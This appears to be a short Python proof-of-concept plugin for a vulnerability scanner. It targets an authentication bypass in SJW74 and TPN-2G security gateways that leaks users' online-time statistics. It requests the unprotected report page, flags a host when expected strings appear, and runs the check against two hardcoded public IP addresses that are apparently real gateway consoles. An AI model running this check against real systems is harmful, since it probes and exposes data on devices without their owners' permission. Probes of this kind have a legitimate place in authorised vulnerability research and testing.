#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 上网时长统计泄露
Author    :  a
mail      :  a@lcx.cc
 
refer :  0day


 因为页面采用的js加载请求服务，对身份进行了简单的验证 ，可以绕过。
        
"""
import urlparse
import time

def assign(service, arg):
    if service == 'adtsec_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
     
    url = arg + 'report/nettime.html'
    code, head, res, errcode, _ = curl.curl2(url )
    #print res ,code2
    if code==200 and 'nettime.js' in res and 'userAudit_countInetTimeExport' in res and 'startTime' in res:
        security_warning(url)
    
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('adtsec_gateway', 'http://211.144.102.114:8080/')[1]) # TPN-2G网关控制台
    audit(assign('adtsec_gateway', 'http://60.174.80.249:8080/')[1]) #SJW74 VPN网关控制台